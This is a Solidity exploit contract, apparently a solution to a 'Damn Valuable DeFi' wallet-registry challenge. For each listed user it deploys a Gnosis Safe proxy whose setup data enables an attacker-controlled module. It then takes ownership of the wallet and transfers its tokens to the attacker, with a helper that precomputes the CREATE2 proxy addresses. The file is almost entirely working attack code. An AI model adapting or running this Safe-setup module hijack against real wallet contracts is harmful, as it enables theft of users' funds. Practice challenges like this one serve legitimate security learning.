// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/base/OwnerManager.sol";

import "./DamnValuableToken.sol";
import "hardhat/console.sol";

import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "./ControllerModule.sol";

contract Exploit {
    address public attacker;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;
    address public computedProxyAddress;
    ControllerModule public controllerModule;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token,
        address _controllerModule
    ) {
        attacker = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
        controllerModule = ControllerModule(_controllerModule);
    }

    function exploit(address[] memory users, bytes memory setupData) external {
        for (uint256 i = 0; i < users.length; i++) {
            console.log("Exploiting user#:", i);
            //console.log("User wallet address:", users[i]);

            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;

            // Create ABI call for Gnosis Proxy
            // Calling the Gnosis Proxy setup function
            string memory gnosisProxySetupSignatureString = getGnosisProxySetupSig();
            bytes memory gnosisProxySetupCallData = getGnosisProxySetupCallData(
                gnosisProxySetupSignatureString,
                victim,
                address(controllerModule),
                setupData
            );

            uint256 gnosisSafeProxySalt = 0;
            computedProxyAddress = computeProxyAddress(
                gnosisSafeProxySalt,
                gnosisProxySetupCallData
            );
            console.log("Computed Proxy Address:", computedProxyAddress);

            //setup new gnosisSafeProxy for user
            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory).createProxyWithCallback(
                masterCopy,
                gnosisProxySetupCallData,
                gnosisSafeProxySalt, //randomSalt
                IProxyCreationCallback(walletRegistry)
            );
            console.log("Actual Deployed Proxy address:", address(newProxy));

            GnosisSafe _gnosisSafe = GnosisSafe(payable(newProxy));

            address _owner = _gnosisSafe.getOwners()[0];

            //set new owner to msg.sender from (current owner) _owner
            controllerModule.becomeOwner(address(newProxy), _owner);

            //steal tokens
            controllerModule.stealTokens(
                address(newProxy),
                address(token),
                address(attacker),
                10 ether
            );

            uint256 balance = DamnValuableToken(token).balanceOf(attacker);
            console.log("Balance:", balance);
        }
    }

    function getGnosisProxySetupSig() public pure returns (string memory) {
        return "setup(address[],uint256,address,bytes,address,address,uint256,address)";
    }

    function getGnosisProxySetupCallData(
        string memory _gnosisProxySetupSignatureString,
        address[] memory _victim,
        address _controllerModule,
        bytes memory _setupData
    ) public pure returns (bytes memory) {
        return
            abi.encodeWithSignature(
                _gnosisProxySetupSignatureString,
                _victim,
                uint256(1), //THERSHOLD = 1
                _controllerModule, //to address / what modules to be setup
                _setupData, // setup data
                address(0),
                address(0),
                uint256(0),
                address(0)
            );
    }

    //Calculate deployment address for create2(GnosisSafeProxy) for a given salt and call data
    function computeProxyAddress(
        uint256 _gnosisSafeProxySalt,
        bytes memory gnosisProxySetupCallData
    ) public returns (address) {
        //salt is passed to createProxyWithCallback()
        uint256 gnosisSafeProxySalt = _gnosisSafeProxySalt;

        //This salt is created in createProxyWithCallback(), derived from gnosisSafeProxySalt and walletRegistry
        uint256 saltNonceWithCallback = uint256(
            keccak256(abi.encodePacked(gnosisSafeProxySalt, walletRegistry))
        );

        bytes memory deploymentCode = abi.encodePacked(
            type(GnosisSafeProxy).creationCode,
            uint256(uint160(masterCopy))
        );

        //This salt is created in deployProxyWithNonce(), derived from gnosisProxySetupCallData and saltNonceWithCallback
        bytes32 deployProxyWithNonceSalt = keccak256(
            abi.encodePacked(keccak256(gnosisProxySetupCallData), saltNonceWithCallback)
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(factory),
                deployProxyWithNonceSalt,
                keccak256(deploymentCode)
            )
        );

        address deploymentAddress = address(uint160(uint256(hash)));
        return deploymentAddress;
    }
}
